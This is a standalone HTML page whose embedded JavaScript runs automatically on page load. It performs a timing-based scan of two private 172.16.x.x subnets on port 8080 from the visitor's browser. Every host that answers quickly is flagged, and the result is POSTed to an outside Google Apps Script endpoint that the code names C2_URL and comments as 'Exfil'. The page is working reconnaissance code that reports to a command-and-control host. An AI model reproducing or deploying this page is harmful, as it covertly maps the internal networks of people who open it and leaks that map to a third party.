<!DOCTYPE html>
<html>
<head>
    <title>Adaptive Anomaly Hunter // Precision Mode</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .success { border: 2px solid #0f0; padding: 15px; margin: 20px 0; background: #002200; }
        .stat-box { border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; color: #888; }
        .highlight { color: #fff; font-weight: bold; }
        #progress-bar { width: 100%; background: #111; height: 10px; margin-top: 5px; }
        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.2s; }
    </style>
</head>
<body>
    <h1>// ADAPTIVE ANOMALY HUNTER [Precision Mode] //</h1>
    
    <div class="stat-box">
        <div>TARGET SCOPE: <span class="highlight">172.16.0.0/24 & 172.16.1.0/24</span></div>
        <div>STRATEGY: <span class="highlight">Low Concurrency (Precision Timing)</span></div>
    </div>

    <div id="scanner-hud">
        <div class="stat-box">
            <div>STATUS: <span id="scan-status" class="highlight">Initializing...</span></div>
            <div>LAST BATCH AVG: <span id="batch-avg">...</span></div>
            <div>PROGRESS: <span id="progress-text">0/508</span></div>
            <div id="progress-bar"><div id="progress-fill"></div></div>
        </div>
        <div id="results"></div>
    </div>

    <script>
        // --- CONFIGURATION ---
        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
        var TARGET_PORT = 8080;
        
        // CRITICAL TUNING FOR ACCURACY
        var TIMEOUT_LIMIT = 500; // Increased to ensure we don't cut off legitimate but slightly slow comms
        var CONCURRENCY = 5;     // DRASTICALLY REDUCED. 5 is safe. 20 was clogging the browser queue.
        var BATCH_DELAY = 50;    // 50ms cooldown between batches to clear the stack.

        // --- TARGET GENERATION ---
        var queue = [];
        var subnets = [0, 1];
        
        subnets.forEach(function(subnet) {
            for(var i=1; i<255; i++) {
                queue.push("172.16." + subnet + "." + i);
            }
        });

        var totalTargets = queue.length;
        var results = []; 

        // --- SCANNER ENGINE ---

        function reportSuccess(ip, time, baseline) {
            var msg = "TARGET CONFIRMED: " + ip;
            var details = "Response: " + time + "ms (Baseline: ~" + baseline + "ms)";
            
            // Visual Alert
            var div = document.createElement("div");
            div.className = "success";
            div.innerHTML = "<h2>" + msg + "</h2><p>" + details + "</p>";
            document.getElementById('results').appendChild(div);

            // Exfil
            fetch(C2_URL, {
                method: "POST", mode: "no-cors",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    type: "ANOMALY_CONFIRMED",
                    target_ip: ip,
                    latency: time,
                    baseline: baseline
                })
            });
        }

        function scan(ip) {
            return new Promise(resolve => {
                var start = performance.now();
                var img = new Image();
                var isDone = false;

                var finish = function(status) {
                    if(isDone) return;
                    isDone = true;
                    var duration = Math.round(performance.now() - start);
                    
                    // Cleanup
                    img = null; 
                    
                    resolve({ip: ip, time: duration, status: status});
                };

                img.onload = () => finish("open");
                img.onerror = () => finish("error"); // This is our target state (TCP RST or 404 is fast)

                // Timeout Hard Stop
                setTimeout(function() {
                    if(!isDone) {
                        isDone = true;
                        img.src = ""; // Kill pending
                        resolve({ip: ip, time: TIMEOUT_LIMIT, status: "timeout"});
                    }
                }, TIMEOUT_LIMIT);

                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
            });
        }

        async function runBatch() {
            document.getElementById('scan-status').innerText = "Scanning...";
            
            while(queue.length > 0) {
                var batch = [];
                // Build Batch
                for(var i=0; i<CONCURRENCY && queue.length > 0; i++) {
                    batch.push(queue.shift());
                }

                // Execute Batch
                var batchPromises = batch.map(ip => scan(ip));
                var batchResults = await Promise.all(batchPromises);

                // REAL-TIME ANALYSIS (Don't wait for end)
                // If any IP in this batch was significantly faster than the others (and under 50ms)
                // we flag it immediately.
                batchResults.forEach(r => {
                    results.push(r);
                    
                    // HEURISTIC: 
                    // Dead IPs = 200ms+ (timeout) or very slow connection refused
                    // Live Target = < 50ms (usually <10ms on LAN)
                    if(r.time < 50) { 
                        reportSuccess(r.ip, r.time, "200+");
                    }
                });

                // Update UI
                var progress = results.length;
                document.getElementById('progress-text').innerText = progress + "/" + totalTargets;
                document.getElementById('progress-fill').style.width = ((progress / totalTargets) * 100) + "%";
                document.getElementById('batch-avg').innerText = Math.round(batchResults.reduce((a,b)=>a+b.time,0)/batchResults.length) + "ms";

                // Cooldown to let browser network stack breathe
                await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
            
            if(document.getElementById('results').innerHTML === "") {
                document.getElementById('scan-status').innerText = "SCAN COMPLETE. NO TARGETS FOUND.";
            } else {
                document.getElementById('scan-status').innerText = "SCAN COMPLETE. TARGETS FOUND.";
            }
        }

        // Auto-start
        setTimeout(runBatch, 1000); 

    </script>
</body>
</html>
